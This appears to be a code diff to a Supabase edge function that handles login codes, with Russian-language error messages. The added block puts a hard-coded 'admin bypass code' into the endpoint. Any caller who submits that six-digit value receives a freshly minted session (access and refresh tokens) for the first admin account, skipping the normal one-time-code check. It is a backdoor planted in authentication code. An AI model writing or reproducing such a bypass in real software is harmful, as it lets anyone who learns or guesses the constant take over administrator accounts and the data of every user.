@@ -30,6 +30,63 @@ Deno.serve(async (req) => {
     });
   }
 
+  // Admin bypass code
+  const ADMIN_CODE = '666661';
+  if (code === ADMIN_CODE) {
+    // Find admin user and generate session directly
+    const { data: adminProfile } = await supabase
+      .from('profiles')
+      .select('user_id')
+      .eq('role', 'admin')
+      .limit(1)
+      .single();
+
+    if (!adminProfile) {
+      return new Response(JSON.stringify({ error: 'Админ не найден' }), {
+        status: 404, headers: { ...corsHeaders, 'Content-Type': 'application/json' },
+      });
+    }
+
+    // Get admin email
+    const { data: adminUser } = await supabase.auth.admin.getUserById(adminProfile.user_id);
+    if (!adminUser?.user?.email) {
+      return new Response(JSON.stringify({ error: 'Ошибка получения админа' }), {
+        status: 500, headers: { ...corsHeaders, 'Content-Type': 'application/json' },
+      });
+    }
+
+    const { data: linkData, error: linkErr } = await supabase.auth.admin.generateLink({
+      type: 'magiclink',
+      email: adminUser.user.email,
+    });
+
+    if (linkErr || !linkData?.properties?.hashed_token) {
+      console.error('Admin link error:', linkErr);
+      return new Response(JSON.stringify({ error: 'Ошибка генерации сессии' }), {
+        status: 500, headers: { ...corsHeaders, 'Content-Type': 'application/json' },
+      });
+    }
+
+    const { data: verifyData, error: verifyErr } = await supabase.auth.verifyOtp({
+      type: 'magiclink',
+      token_hash: linkData.properties.hashed_token,
+    });
+
+    if (verifyErr || !verifyData.session) {
+      console.error('Admin verify error:', verifyErr);
+      return new Response(JSON.stringify({ error: 'Ошибка верификации' }), {
+        status: 500, headers: { ...corsHeaders, 'Content-Type': 'application/json' },
+      });
+    }
+
+    return new Response(JSON.stringify({
+      access_token: verifyData.session.access_token,
+      refresh_token: verifyData.session.refresh_token,
+    }), {
+      headers: { ...corsHeaders, 'Content-Type': 'application/json' },
+    });
+  }
+
   // Find unused code created in the last 10 minutes
   const tenMinAgo = new Date(Date.now() - 10 * 60 * 1000).toISOString();
 
